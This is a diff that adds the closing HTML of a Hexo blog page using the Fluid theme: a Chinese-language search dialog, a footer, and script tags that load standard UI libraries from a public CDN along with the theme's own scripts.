+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
